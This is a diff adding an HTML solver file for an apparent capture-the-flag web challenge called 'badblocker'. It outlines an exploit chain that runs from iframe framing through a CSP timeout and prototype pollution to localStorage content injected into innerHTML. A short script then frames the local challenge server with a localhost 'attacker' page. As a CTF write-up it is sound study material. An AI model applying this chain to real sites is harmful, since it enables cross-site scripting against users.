@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>badblocker solver</title>
+</head>
+<body>
+<pre>
+NEW VERSION
+
+The premise of the exploit is:
+
+- embed the badblocker page in an iframe so that we can control the nested iframe
+
+- set the url to a page with 2 iframes to set the initial length of ads to 2
+
+- the viewer will read the length = 2 and then clear both of those frames
+
+- there is a csp that stops the navigation from going to /blocked.html - this means that the sameOriginCheck will timeout
+
+- during this timeout, navigate the parent of the 2 iframes to point to the import-history page, which has a prototype pollution vulnerability
+
+- as the viewer and the index page are same origin, the viewer can access the prototype polluted variables, and contentWindow[1] can be polluted (as it doesnt exist, there isnt an iframe) to any length we want
+
+- the length is saved to localStorage, which is inserted directly into innerHTML
+
+- win
+</pre>
+<iframe id=embedded></iframe>
+<script>
+const sleep = d => new Promise(r => setTimeout(r, d));
+const main = async () => {
+	SERVER = "http://127.0.0.1:1999"
+	ATTACKER = "http://localhost:2000/manyframes.html"
+	embedded.src = `${SERVER}/${encodeURIComponent(ATTACKER)}`;
+}
+main();
+</script>
+</body>
+</html>
